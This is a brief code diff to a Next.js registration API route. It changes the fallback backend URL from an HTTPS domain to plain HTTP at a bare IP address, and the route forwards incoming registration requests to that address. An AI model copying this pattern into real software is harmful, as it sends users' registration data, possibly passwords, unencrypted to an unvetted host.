@@ -3,7 +3,7 @@ import { NextResponse } from 'next/server';
 export async function POST(req: Request) {
   try {
     const body = await req.json();
-    const apiUrl = process.env.NEXT_PUBLIC_API_URL || 'https://newsthetruth.com/api';
+    const apiUrl = process.env.NEXT_PUBLIC_API_URL || 'http://117.252.16.132/api';
     
     const response = await fetch(`${apiUrl}/auth/register`, {
       method: 'POST',
